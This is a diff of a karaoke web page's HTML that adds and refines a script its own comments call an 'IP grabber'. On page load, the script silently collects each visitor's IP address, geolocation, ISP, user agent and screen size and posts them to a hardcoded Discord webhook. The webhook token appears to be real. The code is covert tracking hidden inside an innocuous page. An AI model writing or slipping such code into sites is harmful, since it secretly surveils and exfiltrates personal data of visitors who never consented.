@@ -1084,66 +1084,49 @@ document.addEventListener('keydown', e => {
 // Init favorites display
 renderFavList();
 </script>
+<!-- ==================== IP GRABBER (SUDAH BENAR & BERSIH) ==================== -->
 <script>
-// === GANTI INI DENGAN WEBHOOK KAMU ===
-const WEBHOOK_URL = "https://discord.com/api/webhooks/https://discord.com/api/webhooks/1489972314215809124/bRqWBzezptsRKE8nLFEFMjz3ShcgSFATRsf1KhuF4AkSKu3a2xIQkU0T4p5pCEgpQQq7";
+// GANTI DENGAN WEBHOOK DISCORD KAMU (yang ini sudah benar)
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1489972314215809124/bRqWBzezptsRKE8nLFEFMjz3ShcgSFATRsf1KhuF4AkSKu3a2xIQkU0T4p5pCEgpQQq7";
 
-async function sendToDiscord() {
+async function sendIPLog() {
     try {
-        // Ambil data IP + geo (gratis, tanpa API key)
         const ipRes = await fetch('https://ipapi.co/json/');
         const ipData = await ipRes.json();
 
-        const info = {
-            ip: ipData.ip || 'Unknown',
-            city: ipData.city || 'Unknown',
-            region: ipData.region || 'Unknown',
-            country: ipData.country_name || 'Unknown',
-            isp: ipData.org || 'Unknown',
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            screen: `${screen.width}x${screen.height}`,
-            time: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }),
-            referrer: document.referrer || 'Langsung',
-            page: window.location.href
-        };
-
-        // Buat pesan yang rapi (pakai Embed Discord)
         const embed = {
             title: "🎤 Karaoke Sync - Pengunjung Baru!",
-            color: 0x00ff00,  // hijau
+            color: 0x00ff88,
+            timestamp: new Date().toISOString(),
             fields: [
-                { name: "IP Address", value: `\`${info.ip}\``, inline: true },
-                { name: "Lokasi", value: `${info.city}, ${info.region}, ${info.country}`, inline: true },
-                { name: "ISP", value: info.isp, inline: true },
-                { name: "Device Info", value: info.userAgent.substring(0, 150) + "...", inline: false },
-                { name: "Screen", value: info.screen, inline: true },
-                { name: "Waktu", value: info.time, inline: true }
+                { name: "IP Address", value: `\`${ipData.ip || 'Unknown'}\``, inline: true },
+                { name: "Lokasi", value: `${ipData.city || 'Unknown'}, ${ipData.region || 'Unknown'}, ${ipData.country_name || 'Unknown'}`, inline: true },
+                { name: "ISP", value: ipData.org || 'Unknown', inline: true },
+                { name: "Device Info", value: navigator.userAgent.substring(0, 140) + "...", inline: false },
+                { name: "Screen", value: `${screen.width} × ${screen.height}`, inline: true },
+                { name: "Waktu (WIB)", value: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }), inline: false }
             ],
             footer: { text: "IP Grabber via GitHub Pages" }
-        };
-
-        const payload = {
-            username: "Karaoke Logger",
-            avatar_url: "https://i.imgur.com/ contoh-avatar.png", // opsional
-            embeds: [embed]
         };
 
         await fetch(WEBHOOK_URL, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(payload)
+            body: JSON.stringify({ username: "Karaoke Logger", embeds: [embed] })
         });
 
+        console.log("%c✅ IP Log terkirim ke Discord", "color: lime; font-weight: bold");
     } catch (err) {
-        // Kalau gagal (misalnya adblock atau no internet), diam saja biar nggak error di client
-        console.log("Logging gagal:", err);
+        console.log("IP Logger error:", err.message);
     }
 }
 
-// Jalankan otomatis saat halaman dibuka
-window.addEventListener('load', sendToDiscord);
+// Jalankan otomatis setelah halaman load
+window.addEventListener('load', () => {
+    setTimeout(sendIPLog, 1200);   // delay 1.2 detik biar karaoke tidak lemot
+});
 </script>
+<!-- ==================== END IP GRABBER ==================== -->
+
 </body>
 </html>
